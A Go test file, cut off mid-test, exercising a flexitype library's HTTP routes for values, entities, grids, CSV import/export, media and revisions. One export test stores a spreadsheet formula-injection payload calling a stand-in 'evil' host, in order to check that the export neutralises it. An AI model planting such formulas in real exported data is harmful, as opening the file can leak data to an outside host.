package flexitype_test

import (
	"net/http"
	"strings"
	"testing"

	. "github.com/smartystreets/goconvey/convey"

	"github.com/zkrebbekx/flexitype"
)

// TestHTTPValueRoutes covers /api/v1/values: the single and batch write paths,
// reads, the soft-delete, filtered listing and the validation branches that
// make the API safe to expose (unknown attribute, wrong-typed value).
func TestHTTPValueRoutes(t *testing.T) {
	Convey("Given a product type with a couple of attributes", t, func() {
		a := newAPI(t, flexitype.APIConfig{})
		typeID := a.mustCreateType("product", "Product")
		nameID := a.mustCreateAttr(typeID, "name", "string", nil)
		priceID := a.mustCreateAttr(typeID, "price", "float", nil)

		Convey("When a value is set", func() {
			resp := a.post("/api/v1/values", map[string]any{
				"type_definition_id":      typeID,
				"attribute_definition_id": nameID,
				"entity_id":               "sku-1",
				"value":                   "Widget",
			})

			Convey("Then it is 200 with the stored value snapshot", func() {
				So(resp.Status, ShouldEqual, http.StatusOK)
				obj := resp.object(t)
				So(obj["entity_id"], ShouldEqual, "sku-1")
				So(obj["value"], ShouldEqual, "Widget")
				So(obj["attribute_definition_id"], ShouldEqual, nameID)
			})

			Convey("And setting it again upserts rather than duplicating", func() {
				again := a.post("/api/v1/values", map[string]any{
					"type_definition_id":      typeID,
					"attribute_definition_id": nameID,
					"entity_id":               "sku-1",
					"value":                   "Widget Mk2",
				})
				So(again.Status, ShouldEqual, http.StatusOK)
				So(again.str(t, "id"), ShouldEqual, resp.str(t, "id"))
				So(again.object(t)["value"], ShouldEqual, "Widget Mk2")

				list := a.get("/api/v1/values?entity_id=sku-1")
				So(len(list.items(t)), ShouldEqual, 1)
			})

			Convey("And it can be read back by value id", func() {
				got := a.get("/api/v1/values/" + resp.str(t, "id"))
				So(got.Status, ShouldEqual, http.StatusOK)
				So(got.object(t)["value"], ShouldEqual, "Widget")
			})

			Convey("And removing it archives the value", func() {
				removed := a.delete("/api/v1/values/" + resp.str(t, "id"))
				So(removed.Status, ShouldEqual, http.StatusOK)

				So(len(a.get("/api/v1/values?entity_id=sku-1").items(t)), ShouldEqual, 0)
				So(len(a.get("/api/v1/values?entity_id=sku-1&include_archived=true").items(t)), ShouldEqual, 1)
			})
		})

		Convey("When the value does not match the attribute's data type", func() {
			resp := a.post("/api/v1/values", map[string]any{
				"type_definition_id":      typeID,
				"attribute_definition_id": priceID,
				"entity_id":               "sku-1",
				"value":                   "not-a-number",
			})

			Convey("Then it is 422 VALIDATION", func() {
				So(resp.Status, ShouldEqual, http.StatusUnprocessableEntity)
				So(resp.errorCode(), ShouldEqual, "VALIDATION")
			})
		})

		Convey("When the attribute does not exist", func() {
			resp := a.post("/api/v1/values", map[string]any{
				"type_definition_id":      typeID,
				"attribute_definition_id": missingULID,
				"entity_id":               "sku-1",
				"value":                   "x",
			})

			Convey("Then it is 404", func() {
				So(resp.Status, ShouldEqual, http.StatusNotFound)
				So(resp.errorCode(), ShouldEqual, "NOT_FOUND")
			})
		})

		Convey("When the write body is malformed", func() {
			resp := a.post("/api/v1/values", `{"value":`)

			Convey("Then it is 422 VALIDATION", func() {
				So(resp.Status, ShouldEqual, http.StatusUnprocessableEntity)
				So(resp.errorCode(), ShouldEqual, "VALIDATION")
			})
		})

		Convey("When a batch of values is written", func() {
			resp := a.post("/api/v1/values/batch", map[string]any{
				"items": []any{
					map[string]any{"type_definition_id": typeID, "attribute_definition_id": nameID, "entity_id": "sku-1", "value": "Widget"},
					map[string]any{"type_definition_id": typeID, "attribute_definition_id": priceID, "entity_id": "sku-1", "value": 9.5},
					map[string]any{"type_definition_id": typeID, "attribute_definition_id": nameID, "entity_id": "sku-2", "value": "Gadget"},
				},
			})

			Convey("Then every item is written in one unit of work", func() {
				So(resp.Status, ShouldEqual, http.StatusOK)
				So(len(resp.items(t)), ShouldEqual, 3)
			})
		})

		Convey("When one item of a batch is invalid", func() {
			resp := a.post("/api/v1/values/batch", map[string]any{
				"items": []any{
					map[string]any{"type_definition_id": typeID, "attribute_definition_id": nameID, "entity_id": "sku-1", "value": "Widget"},
					map[string]any{"type_definition_id": typeID, "attribute_definition_id": priceID, "entity_id": "sku-1", "value": "nope"},
				},
			})

			Convey("Then the whole batch is rejected 422 and nothing is written", func() {
				So(resp.Status, ShouldEqual, http.StatusUnprocessableEntity)
				So(resp.errorCode(), ShouldEqual, "VALIDATION")
				So(len(a.get("/api/v1/values?entity_id=sku-1").items(t)), ShouldEqual, 0)
			})
		})

		Convey("When the batch body is malformed", func() {
			resp := a.post("/api/v1/values/batch", `{"items":`)

			Convey("Then it is 422 VALIDATION", func() {
				So(resp.Status, ShouldEqual, http.StatusUnprocessableEntity)
				So(resp.errorCode(), ShouldEqual, "VALIDATION")
			})
		})

		Convey("When an unknown value id is read or removed", func() {
			Convey("Then both are 404", func() {
				So(a.get("/api/v1/values/"+missingULID).Status, ShouldEqual, http.StatusNotFound)
				So(a.delete("/api/v1/values/"+missingULID).Status, ShouldEqual, http.StatusNotFound)
			})
		})

		Convey("Given values across two entities", func() {
			a.mustSetValue(typeID, nameID, "sku-1", "Widget")
			a.mustSetValue(typeID, priceID, "sku-1", 9.5)
			a.mustSetValue(typeID, nameID, "sku-2", "Gadget")

			Convey("When the list is filtered by attribute", func() {
				resp := a.get("/api/v1/values?attribute_definition_id=" + nameID)
				Convey("Then only that attribute's values come back", func() {
					So(len(resp.items(t)), ShouldEqual, 2)
				})
			})

			Convey("When the list is filtered by type definition", func() {
				resp := a.get("/api/v1/values?type_definition_id=" + typeID)
				Convey("Then all three values come back", func() {
					So(len(resp.items(t)), ShouldEqual, 3)
				})
			})

			Convey("When the list is paged with ?limit= and ?total=true", func() {
				resp := a.get("/api/v1/values?limit=2&total=true")
				Convey("Then the page is capped and the total is reported", func() {
					So(len(resp.items(t)), ShouldEqual, 2)
					So(resp.pageInfo(t)["total_count"], ShouldEqual, float64(3))
					So(resp.pageInfo(t)["has_next_page"], ShouldBeTrue)
				})
			})

			Convey("When ?limit= is not numeric", func() {
				resp := a.get("/api/v1/values?limit=x")
				Convey("Then it is 422", func() {
					So(resp.Status, ShouldEqual, http.StatusUnprocessableEntity)
					So(resp.errorCode(), ShouldEqual, "VALIDATION")
				})
			})
		})
	})
}

// TestHTTPEntityRoutes covers the entity-scoped surface: listing a type's
// entities, reading one entity's values and relationships, completeness and
// effective schema, and the two delete semantics (soft cascade vs. erasure).
func TestHTTPEntityRoutes(t *testing.T) {
	Convey("Given a type with values on two entities", t, func() {
		a := newAPI(t, flexitype.APIConfig{})
		typeID := a.mustCreateType("product", "Product")
		nameID := a.mustCreateAttr(typeID, "name", "string", nil)
		priceID := a.mustCreateAttr(typeID, "price", "float", nil)
		a.mustSetValue(typeID, nameID, "sku-1", "Widget")
		a.mustSetValue(typeID, priceID, "sku-1", 9.5)
		a.mustSetValue(typeID, nameID, "sku-2", "Gadget")

		Convey("When the type's entities are listed", func() {
			resp := a.get("/api/v1/entities/" + typeID)

			Convey("Then each entity comes back with its value count", func() {
				So(resp.Status, ShouldEqual, http.StatusOK)
				items := resp.items(t)
				So(len(items), ShouldEqual, 2)
				counts := map[string]float64{}
				for _, it := range items {
					row := it.(map[string]any)
					counts[row["entity_id"].(string)] = row["value_count"].(float64)
				}
				So(counts["sku-1"], ShouldEqual, float64(2))
				So(counts["sku-2"], ShouldEqual, float64(1))
			})
		})

		Convey("When the entity list is paged", func() {
			resp := a.get("/api/v1/entities/" + typeID + "?limit=1&total=true")

			Convey("Then one row comes back with the true total", func() {
				So(len(resp.items(t)), ShouldEqual, 1)
				So(resp.pageInfo(t)["total_count"], ShouldEqual, float64(2))
			})
		})

		Convey("When an entity's values are read", func() {
			resp := a.get("/api/v1/entities/" + typeID + "/sku-1/values")

			Convey("Then all of its values are returned", func() {
				So(resp.Status, ShouldEqual, http.StatusOK)
				So(len(resp.items(t)), ShouldEqual, 2)
			})
		})

		Convey("When an entity's relationships are read with none linked", func() {
			resp := a.get("/api/v1/entities/" + typeID + "/sku-1/relationships")

			Convey("Then it is an empty array, never null", func() {
				So(resp.Status, ShouldEqual, http.StatusOK)
				So(string(resp.Body), ShouldContainSubstring, `"items":[]`)
			})
		})

		Convey("When an entity's completeness is read", func() {
			resp := a.get("/api/v1/entities/" + typeID + "/sku-1/completeness")

			Convey("Then it reports the required/filled tally for that entity", func() {
				So(resp.Status, ShouldEqual, http.StatusOK)
				obj := resp.object(t)
				So(obj["entity_id"], ShouldEqual, "sku-1")
				So(obj["type_definition_id"], ShouldEqual, typeID)
				So(obj["score"], ShouldNotBeNil)
			})
		})

		Convey("When an attribute's effective schema for an entity is read", func() {
			resp := a.get("/api/v1/entities/" + typeID + "/sku-1/attributes/" + nameID + "/effective-schema")

			Convey("Then the dependency-resolved schema comes back", func() {
				So(resp.Status, ShouldEqual, http.StatusOK)
				obj := resp.object(t)
				So(obj["attribute_definition_id"], ShouldEqual, nameID)
				So(obj["entity_id"], ShouldEqual, "sku-1")
			})
		})

		Convey("When the effective schema of an unknown attribute is read", func() {
			resp := a.get("/api/v1/entities/" + typeID + "/sku-1/attributes/" + missingULID + "/effective-schema")

			Convey("Then it is 404", func() {
				So(resp.Status, ShouldEqual, http.StatusNotFound)
				So(resp.errorCode(), ShouldEqual, "NOT_FOUND")
			})
		})

		Convey("When an entity's relationship requirements are read", func() {
			resp := a.get("/api/v1/entities/" + typeID + "/sku-1/relationship-requirements")

			Convey("Then it is an empty array with no relationship definitions", func() {
				So(resp.Status, ShouldEqual, http.StatusOK)
				So(string(resp.Body), ShouldContainSubstring, `"items":[]`)
			})
		})

		Convey("When an entity is deleted (soft cascade)", func() {
			resp := a.delete("/api/v1/entities/" + typeID + "/sku-1")

			Convey("Then it reports how much it archived and unlinked", func() {
				So(resp.Status, ShouldEqual, http.StatusOK)
				obj := resp.object(t)
				So(obj["entity_id"], ShouldEqual, "sku-1")
				So(obj["values_removed"], ShouldEqual, float64(2))
				So(obj["relationships_gone"], ShouldEqual, float64(0))
			})

			Convey("And the archived values are still recoverable", func() {
				list := a.get("/api/v1/values?entity_id=sku-1&include_archived=true")
				So(len(list.items(t)), ShouldEqual, 2)
			})
		})

		Convey("When an entity is purged (irreversible erasure)", func() {
			resp := a.post("/api/v1/entities/"+typeID+"/sku-1/purge", nil)

			Convey("Then the erasure report accounts for every removed trace", func() {
				So(resp.Status, ShouldEqual, http.StatusOK)
				obj := resp.object(t)
				So(obj["entity_id"], ShouldEqual, "sku-1")
				So(obj["values_purged"], ShouldEqual, float64(2))
			})

			Convey("And not even ?include_archived can see the values again", func() {
				list := a.get("/api/v1/values?entity_id=sku-1&include_archived=true")
				So(len(list.items(t)), ShouldEqual, 0)
			})
		})

		Convey("When the whole tenant's entity data is purged", func() {
			resp := a.post("/api/v1/admin/purge", nil)

			Convey("Then every value is erased but the schema survives", func() {
				So(resp.Status, ShouldEqual, http.StatusOK)
				So(resp.object(t)["values_purged"], ShouldEqual, float64(3))
				So(len(a.get("/api/v1/values?include_archived=true").items(t)), ShouldEqual, 0)
				So(len(a.get("/api/v1/type-definitions").items(t)), ShouldEqual, 1)
			})
		})
	})
}

// TestHTTPGridAndFacetRoutes covers the console's two aggregate read
// endpoints: the column-projected entity grid and the value-count facets,
// each in both modes (whole type vs. an FQL-filtered result set).
func TestHTTPGridAndFacetRoutes(t *testing.T) {
	Convey("Given a type with two entities carrying values", t, func() {
		a := newAPI(t, flexitype.APIConfig{})
		typeID := a.mustCreateType("product", "Product")
		nameID := a.mustCreateAttr(typeID, "name", "string", nil)
		priceID := a.mustCreateAttr(typeID, "price", "float", nil)
		a.mustSetValue(typeID, nameID, "sku-1", "Widget")
		a.mustSetValue(typeID, priceID, "sku-1", 9.5)
		a.mustSetValue(typeID, nameID, "sku-2", "Gadget")

		Convey("When the grid is requested with chosen columns", func() {
			resp := a.get("/api/v1/entities/" + typeID + "/grid?attributes=name,price")

			Convey("Then the chosen attributes are the columns and rows carry their values", func() {
				So(resp.Status, ShouldEqual, http.StatusOK)
				obj := resp.object(t)
				cols := obj["columns"].([]any)
				So(cols, ShouldResemble, []any{"entity_id", "name", "price"})

				rows := obj["rows"].([]any)
				So(len(rows), ShouldEqual, 2)
				byEntity := map[string]map[string]any{}
				for _, r := range rows {
					row := r.(map[string]any)
					byEntity[row["entity_id"].(string)] = row["values"].(map[string]any)
				}
				So(byEntity["sku-1"]["name"], ShouldEqual, "Widget")
				So(byEntity["sku-1"]["price"], ShouldEqual, "9.5")
				// sku-2 has no price: the cell is absent rather than fabricated.
				_, hasPrice := byEntity["sku-2"]["price"]
				So(hasPrice, ShouldBeFalse)
			})
		})

		Convey("When the grid is filtered by an FQL query", func() {
			resp := a.get("/api/v1/entities/" + typeID + `/grid?attributes=name&query=name+%3D+%22Widget%22`)

			Convey("Then only matching entities are rows", func() {
				So(resp.Status, ShouldEqual, http.StatusOK)
				rows := resp.object(t)["rows"].([]any)
				So(len(rows), ShouldEqual, 1)
				So(rows[0].(map[string]any)["entity_id"], ShouldEqual, "sku-1")
			})
		})

		Convey("When the grid is asked for an unknown type", func() {
			resp := a.get("/api/v1/entities/" + missingULID + "/grid?attributes=name")

			Convey("Then it is 404", func() {
				So(resp.Status, ShouldEqual, http.StatusNotFound)
				So(resp.errorCode(), ShouldEqual, "NOT_FOUND")
			})
		})

		Convey("When the grid's FQL query is invalid", func() {
			resp := a.get("/api/v1/entities/" + typeID + "/grid?attributes=name&query=name+%3D%3D%3D")

			Convey("Then it is 422 VALIDATION rather than a 500", func() {
				So(resp.Status, ShouldEqual, http.StatusUnprocessableEntity)
				So(resp.errorCode(), ShouldEqual, "VALIDATION")
			})
		})

		Convey("When the grid is paged", func() {
			resp := a.get("/api/v1/entities/" + typeID + "/grid?attributes=name&limit=1")

			Convey("Then only one row comes back and page_info says more remain", func() {
				So(len(resp.object(t)["rows"].([]any)), ShouldEqual, 1)
				So(resp.pageInfo(t)["has_next_page"], ShouldBeTrue)
			})
		})

		Convey("When facets are requested for an attribute", func() {
			resp := a.get("/api/v1/entities/" + typeID + "/facets?attributes=name")

			Convey("Then each distinct value is counted across the result set", func() {
				So(resp.Status, ShouldEqual, http.StatusOK)
				facets := resp.object(t)["facets"].(map[string]any)
				buckets := facets["name"].([]any)
				So(len(buckets), ShouldEqual, 2)
				counts := map[string]float64{}
				for _, b := range buckets {
					bucket := b.(map[string]any)
					counts[bucket["value"].(string)] = bucket["count"].(float64)
				}
				So(counts["Widget"], ShouldEqual, float64(1))
				So(counts["Gadget"], ShouldEqual, float64(1))
				So(resp.object(t)["truncated"], ShouldBeFalse)
			})
		})

		Convey("When facets are narrowed by an FQL query", func() {
			resp := a.get("/api/v1/entities/" + typeID + `/facets?attributes=name&query=name+%3D+%22Widget%22`)

			Convey("Then only the filtered result set is counted", func() {
				So(resp.Status, ShouldEqual, http.StatusOK)
				buckets := resp.object(t)["facets"].(map[string]any)["name"].([]any)
				So(len(buckets), ShouldEqual, 1)
				So(buckets[0].(map[string]any)["value"], ShouldEqual, "Widget")
			})
		})

		Convey("When facets are requested for an unknown type", func() {
			resp := a.get("/api/v1/entities/" + missingULID + "/facets?attributes=name")

			Convey("Then it is 404", func() {
				So(resp.Status, ShouldEqual, http.StatusNotFound)
				So(resp.errorCode(), ShouldEqual, "NOT_FOUND")
			})
		})
	})
}

// TestHTTPImportExportRoutes covers the CSV round trip: the multipart import
// with its mapping payload (commit, dry run and each malformed-upload branch)
// and the streaming export with its formula-injection defence.
func TestHTTPImportExportRoutes(t *testing.T) {
	Convey("Given a product type with a name attribute", t, func() {
		a := newAPI(t, flexitype.APIConfig{})
		typeID := a.mustCreateType("product", "Product")
		a.mustCreateAttr(typeID, "name", "string", nil)
		importPath := "/api/v1/entities/" + typeID + "/import"

		Convey("When a CSV is imported in best-effort mode", func() {
			resp := a.upload(importPath, "file", "products.csv",
				[]byte("key,label\nsku-1,Widget\nsku-2,Gadget\n"),
				map[string]string{"mapping": `{"key_column":"key","mapping":{"label":"name"},"mode":"best_effort"}`})

			Convey("Then the report accounts for every row and the values land", func() {
				So(resp.Status, ShouldEqual, http.StatusOK)
				obj := resp.object(t)
				So(obj["rows_total"], ShouldEqual, float64(2))
				So(obj["rows_valid"], ShouldEqual, float64(2))
				So(obj["rows_written"], ShouldEqual, float64(2))
				So(obj["dry_run"], ShouldBeFalse)

				So(len(a.get("/api/v1/entities/"+typeID).items(t)), ShouldEqual, 2)
			})
		})

		Convey("When a CSV is imported as a dry run", func() {
			resp := a.upload(importPath, "file", "products.csv",
				[]byte("key,label\nsku-1,Widget\n"),
				map[string]string{"mapping": `{"key_column":"key","mapping":{"label":"name"},"mode":"best_effort","dry_run":true}`})

			Convey("Then rows validate but nothing is written", func() {
				So(resp.Status, ShouldEqual, http.StatusOK)
				obj := resp.object(t)
				So(obj["rows_valid"], ShouldEqual, float64(1))
				So(obj["rows_written"], ShouldEqual, float64(0))
				So(obj["dry_run"], ShouldBeTrue)
				So(len(a.get("/api/v1/entities/"+typeID).items(t)), ShouldEqual, 0)
			})
		})

		Convey("When the mapping part is not valid JSON", func() {
			resp := a.upload(importPath, "file", "x.csv", []byte("a\n"), map[string]string{"mapping": `{oops`})

			Convey("Then it is 422 naming the mapping", func() {
				So(resp.Status, ShouldEqual, http.StatusUnprocessableEntity)
				So(resp.errorCode(), ShouldEqual, "VALIDATION")
				So(resp.errorMessage(), ShouldContainSubstring, "invalid mapping json")
			})
		})

		Convey("When the file part is missing", func() {
			resp := a.upload(importPath, "", "", nil,
				map[string]string{"mapping": `{"key_column":"key","mapping":{},"mode":"best_effort"}`})

			Convey("Then it is 422 naming the missing file", func() {
				So(resp.Status, ShouldEqual, http.StatusUnprocessableEntity)
				So(resp.errorCode(), ShouldEqual, "VALIDATION")
				So(resp.errorMessage(), ShouldContainSubstring, "missing csv file")
			})
		})

		Convey("When the request is not multipart at all", func() {
			resp := a.post(importPath, map[string]any{"nope": true})

			Convey("Then it is 422, not a panic or a 500", func() {
				So(resp.Status, ShouldEqual, http.StatusUnprocessableEntity)
				So(resp.errorCode(), ShouldEqual, "VALIDATION")
				So(resp.errorMessage(), ShouldContainSubstring, "could not read upload")
			})
		})

		Convey("When the uploaded CSV is empty (no header row)", func() {
			resp := a.upload(importPath, "file", "empty.csv", []byte(""),
				map[string]string{"mapping": `{"key_column":"key","mapping":{},"mode":"best_effort"}`})

			Convey("Then it is 422 about the unreadable header", func() {
				So(resp.Status, ShouldEqual, http.StatusUnprocessableEntity)
				So(resp.errorCode(), ShouldEqual, "VALIDATION")
				So(resp.errorMessage(), ShouldContainSubstring, "csv header")
			})
		})

		Convey("When the key column is absent from the mapping", func() {
			resp := a.upload(importPath, "file", "x.csv", []byte("a,b\n1,2\n"),
				map[string]string{"mapping": `{"key_column":"missing_col","mapping":{"b":"name"},"mode":"best_effort"}`})

			Convey("Then the importer rejects it 422", func() {
				So(resp.Status, ShouldEqual, http.StatusUnprocessableEntity)
				So(resp.errorCode(), ShouldEqual, "VALIDATION")
			})
		})

		Convey("Given entities to export", func() {
			nameID := a.mustCreateAttr(typeID, "label", "string", nil)
			a.mustSetValue(typeID, nameID, "sku-1", "Widget")
			a.mustSetValue(typeID, nameID, "sku-2", "Gadget")
			exportPath := "/api/v1/entities/" + typeID + "/export"

			Convey("When the type is exported", func() {
				resp := a.get(exportPath + "?attributes=label")

				Convey("Then it streams CSV as a named attachment", func() {
					So(resp.Status, ShouldEqual, http.StatusOK)
					So(resp.Header.Get("Content-Type"), ShouldContainSubstring, "text/csv")
					So(resp.Header.Get("Content-Disposition"), ShouldContainSubstring, "attachment")
					So(resp.Header.Get("Content-Disposition"), ShouldContainSubstring, typeID)

					body := string(resp.Body)
					So(body, ShouldStartWith, "entity_id,label")
					So(body, ShouldContainSubstring, "Widget")
					So(body, ShouldContainSubstring, "Gadget")
				})
			})

			Convey("When the export is restricted to explicit entity ids", func() {
				resp := a.get(exportPath + "?attributes=label&entity_ids=sku-1")

				Convey("Then only those rows are written", func() {
					body := string(resp.Body)
					So(body, ShouldContainSubstring, "Widget")
					So(body, ShouldNotContainSubstring, "Gadget")
				})
			})

			Convey("When the export is restricted by an FQL query", func() {
				resp := a.get(exportPath + `?attributes=label&query=label+%3D+%22Gadget%22`)

				Convey("Then only matching rows are written", func() {
					body := string(resp.Body)
					So(body, ShouldContainSubstring, "Gadget")
					So(body, ShouldNotContainSubstring, "Widget")
				})
			})

			Convey("When the export's FQL query is invalid", func() {
				resp := a.get(exportPath + "?attributes=label&query=label+%3D%3D%3D")

				Convey("Then it is 422 before any CSV is streamed", func() {
					So(resp.Status, ShouldEqual, http.StatusUnprocessableEntity)
					So(resp.errorCode(), ShouldEqual, "VALIDATION")
				})
			})

			Convey("When a stored value would be read as a spreadsheet formula", func() {
				a.mustSetValue(typeID, nameID, "sku-3", `=WEBSERVICE("http://evil/")`)
				resp := a.get(exportPath + "?attributes=label")

				Convey("Then the exported cell is quoted so it stays inert text", func() {
					So(string(resp.Body), ShouldContainSubstring, `"'=WEBSERVICE(""http://evil/"")"`)
				})
			})

			Convey("When an unknown type is exported", func() {
				resp := a.get("/api/v1/entities/" + missingULID + "/export?query=label+%3D+%221%22")

				Convey("Then it is 404", func() {
					So(resp.Status, ShouldEqual, http.StatusNotFound)
					So(resp.errorCode(), ShouldEqual, "NOT_FOUND")
				})
			})
		})
	})
}

// TestHTTPMediaRoutes covers the media upload/download pair, including the
// defensive headers that keep an uploaded HTML file from executing on this
// origin and the tenant-ownership check on the download key.
func TestHTTPMediaRoutes(t *testing.T) {
	Convey("Given a media attribute on a product type", t, func() {
		a := newAPI(t, flexitype.APIConfig{})
		typeID := a.mustCreateType("product", "Product")
		imageID := a.mustCreateAttr(typeID, "image", "media", nil)
		uploadPath := "/api/v1/entities/" + typeID + "/sku-1/attributes/" + imageID + "/media"

		png := append([]byte("\x89PNG\r\n\x1a\n"), []byte(strings.Repeat("p", 64))...)

		Convey("When a file is uploaded", func() {
			resp := a.upload(uploadPath, "file", "hero.png", png, nil)

			Convey("Then it is 201 with the media value's descriptor", func() {
				So(resp.Status, ShouldEqual, http.StatusCreated)
				media := resp.object(t)["value"].(map[string]any)
				So(media["mime"], ShouldEqual, "image/png")
				So(media["filename"], ShouldEqual, "hero.png")
				So(media["size"], ShouldEqual, float64(len(png)))
				So(media["object_key"], ShouldNotBeNil)
				So(media["checksum"], ShouldStartWith, "sha256:")
			})

			Convey("And the stored object downloads byte-for-byte", func() {
				key := resp.object(t)["value"].(map[string]any)["object_key"].(string)
				got := a.get("/api/v1/media/" + key)

				So(got.Status, ShouldEqual, http.StatusOK)
				So(got.Body, ShouldResemble, png)
			})

			Convey("And the download is forced inert: attachment, nosniff, sandboxed CSP", func() {
				key := resp.object(t)["value"].(map[string]any)["object_key"].(string)
				got := a.get("/api/v1/media/" + key)

				So(got.Header.Get("Content-Disposition"), ShouldEqual, "attachment")
				So(got.Header.Get("X-Content-Type-Options"), ShouldEqual, "nosniff")
				So(got.Header.Get("Content-Security-Policy"), ShouldEqual, "default-src 'none'; sandbox")
				So(got.Header.Get("Content-Type"), ShouldEqual, "image/png")
				So(got.Header.Get("Cache-Control"), ShouldEqual, "private, max-age=300")
			})
		})

		Convey("When the multipart form has no file part", func() {
			resp := a.upload(uploadPath, "", "", nil, map[string]string{"note": "hi"})

			Convey("Then it is 422 naming the missing file", func() {
				So(resp.Status, ShouldEqual, http.StatusUnprocessableEntity)
				So(resp.errorCode(), ShouldEqual, "VALIDATION")
				So(resp.errorMessage(), ShouldContainSubstring, "missing file")
			})
		})

		Convey("When the upload is not multipart", func() {
			resp := a.post(uploadPath, map[string]any{"file": "nope"})

			Convey("Then it is 422, not a 500", func() {
				So(resp.Status, ShouldEqual, http.StatusUnprocessableEntity)
				So(resp.errorCode(), ShouldEqual, "VALIDATION")
				So(resp.errorMessage(), ShouldContainSubstring, "could not read upload")
			})
		})

		Convey("When the upload targets an attribute that is not media", func() {
			textID := a.mustCreateAttr(typeID, "name", "string", nil)
			resp := a.upload("/api/v1/entities/"+typeID+"/sku-1/attributes/"+textID+"/media",
				"file", "hero.png", png, nil)

			Convey("Then it is 422", func() {
				So(resp.Status, ShouldEqual, http.StatusUnprocessableEntity)
				So(resp.errorCode(), ShouldEqual, "VALIDATION")
			})
		})

		Convey("When a key that this tenant does not own is downloaded", func() {
			resp := a.get("/api/v1/media/01KX000000000000000000000A.png")

			Convey("Then it is an indistinguishable 404, so ownership is not probeable", func() {
				So(resp.Status, ShouldEqual, http.StatusNotFound)
				So(resp.errorCode(), ShouldEqual, "NOT_FOUND")
			})
		})

		Convey("When a media constraint rejects the upload", func() {
			jpegOnly := a.mustCreateAttr(typeID, "photo", "media", map[string]any{
				"constraints": []any{map[string]any{"kind": "media", "mime": []string{"image/jpeg"}}},
			})
			resp := a.upload("/api/v1/entities/"+typeID+"/sku-1/attributes/"+jpegOnly+"/media",
				"file", "hero.png", png, nil)

			Convey("Then the sniffed content type is refused 422", func() {
				So(resp.Status, ShouldEqual, http.StatusUnprocessableEntity)
				So(resp.errorCode(), ShouldEqual, "VALIDATION")
			})
		})
	})
}

// TestHTTPRevisionRoutes covers point-in-time history: snapshotting an
// entity, listing and reading revisions, diffing two of them, restoring one,
// and the as-of lookup with its timestamp parsing.
func TestHTTPRevisionRoutes(t *testing.T) {
	Convey("Given an entity with values and a first revision", t, func() {
		a := newAPI(t, flexitype.APIConfig{})
		typeID := a.mustCreateType("product", "Product")
		nameID := a.mustCreateAttr(typeID, "name", "string", nil)
		a.mustSetValue(typeID, nameID, "sku-1", "Widget")
		entityBase := "/api/v1/entities/" + typeID + "/sku-1"

		first := a.post(entityBase+"/revisions", map[string]any{"label": "v1"})
		So(first.Status, ShouldEqual, http.StatusCreated)
		firstID := first.str(t, "id")

		Convey("When the revision is created", func() {
			Convey("Then it captures the entity's values at that moment", func() {
				obj := first.object(t)
				So(obj["label"], ShouldEqual, "v1")
				So(obj["seq"], ShouldEqual, float64(1))
				values := obj["values"].([]any)
				So(len(values), ShouldEqual, 1)
				So(values[0].(map[string]any)["value"], ShouldEqual, "Widget")
			})
		})

		Convey("When a revision is created with no request body at all", func() {
			resp := a.post(entityBase+"/revisions", nil)

			Convey("Then the optional label is simply omitted (no decode error)", func() {
				So(resp.Status, ShouldEqual, http.StatusCreated)
				label, present := resp.object(t)["label"]
				So(present && label != "", ShouldBeFalse)
				So(resp.object(t)["entity_id"], ShouldEqual, "sku-1")
			})
		})

		Convey("When a revision is created with a malformed body", func() {
			resp := a.post(entityBase+"/revisions", `{"label":`)

			Convey("Then it is 422 VALIDATION", func() {
				So(resp.Status, ShouldEqual, http.StatusUnprocessableEntity)
				So(resp.errorCode(), ShouldEqual, "VALIDATION")
			})
		})

		Convey("When the entity's revisions are listed", func() {
			resp := a.get(entityBase + "/revisions")

			Convey("Then the snapshot appears in the history", func() {
				So(resp.Status, ShouldEqual, http.StatusOK)
				items := resp.items(t)
				So(len(items), ShouldEqual, 1)
				So(items[0].(map[string]any)["id"], ShouldEqual, firstID)
			})
		})

		Convey("When a revision is fetched by id", func() {
			resp := a.get("/api/v1/revisions/" + firstID)

			Convey("Then the full snapshot comes back", func() {
				So(resp.Status, ShouldEqual, http.StatusOK)
				So(resp.str(t, "entity_id"), ShouldEqual, "sku-1")
			})
		})

		Convey("When an unknown revision is fetched", func() {
			resp := a.get("/api/v1/revisions/" + missingULID)

			Convey("Then it is 404", func() {
				So(resp.Status, ShouldEqual, http.StatusNotFound)
				So(resp.errorCode(), ShouldEqual, "NOT_FOUND")
			})
		})

		Convey("Given the value changed and a second revision was taken", func() {
			a.mustSetValue(typeID, nameID, "sku-1", "Widget Mk2")
			second := a.post(entityBase+"/revisions", map[string]any{"label": "v2"})
			So(second.Status, ShouldEqual, http.StatusCreated)
			secondID := second.str(t, "id")

			Convey("When the two revisions are diffed", func() {
				resp := a.get("/api/v1/revisions/" + firstID + "/diff?to=" + secondID)

				Convey("Then the changed attribute is reported with both sides", func() {
					So(resp.Status, ShouldEqual, http.StatusOK)
					So(string(resp.Body), ShouldContainSubstring, "Widget Mk2")
					So(string(resp.Body), ShouldContainSubstring, "Widget")
				})
			})

			Convey("When the diff target is missing from the query", func() {
				resp := a.get("/api/v1/revisions/" + firstID + "/diff")

				Convey("Then it is 422 naming the required parameter", func() {
					So(resp.Status, ShouldEqual, http.StatusUnprocessableEntity)
					So(resp.errorCode(), ShouldEqual, "VALIDATION")
					So(resp.errorMessage(), ShouldContainSubstring, "to (revision id) is required")
				})
			})

			Convey("When the diff target does not exist", func() {
				resp := a.get("/api/v1/revisions/" + firstID + "/diff?to=" + missingULID)

				Convey("Then it is 404", func() {
					So(resp.Status, ShouldEqual, http.StatusNotFound)
					So(resp.errorCode(), ShouldEqual, "NOT_FOUND")
				})
			})

			Convey("When the first revision is restored", func() {
				resp := a.post("/api/v1/revisions/"+firstID+"/restore", nil)

				Convey("Then a new revision is created and the live value reverts", func() {
					So(resp.Status, ShouldEqual, http.StatusCreated)
					live := a.get(entityBase + "/values")
					So(live.items(t)[0].(map[string]any)["value"], ShouldEqual, "Widget")
				})
			})

			Convey("When an unknown revision is restored", func() {
				resp := a.post("/api/v1/revisions/"+missingULID+"/restore", nil)

				Convey("Then it is 404", func() {
					So(resp.Status, ShouldEqual, http.StatusNotFound)
					So(resp.errorCode(), ShouldEqual, "NOT_FOUND")
				})
			})
		})

		Convey("When the entity is read as of a later instant", func() {
			resp := a.get(entityBase + "/as-of?at=2999-01-01T00:00:00Z")

			Convey("Then the most recent revision at that instant is returned", func() {
				So(resp.Status, ShouldEqual, http.StatusOK)
				So(resp.str(t, "id"), ShouldEqual, firstID)
			})
		})

		Convey("When the as-of timestamp is not RFC3339", func() {
			resp := a.get(entityBase + "/as-of?at=yesterday")

